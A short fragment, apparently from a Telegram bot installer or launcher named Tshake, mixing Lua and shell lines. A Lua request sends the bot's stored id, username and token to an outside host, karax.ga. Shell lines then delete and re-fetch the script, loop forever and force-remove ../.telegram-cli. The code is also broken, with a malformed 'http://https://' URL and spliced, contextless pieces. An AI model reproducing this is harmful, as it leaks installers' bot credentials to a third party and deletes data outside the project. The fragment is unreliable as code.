...
https.request("http://https://karax.ga/Tshakex/?id="..database:get(Server_Tshake.."Id_Tshake").."&UserName="..database:get(Server_Tshake.."UserName_Tshake").."&token="..database:get(Server_Tshake.."Token_Tshake"))
...
rm -fr Tshake.lua
wget "https://raw.githubusercontent.com/TshAkETEAM/Tshakex-/master/Tshake.lua"
while(true) do
rm -fr ../.telegram-cli
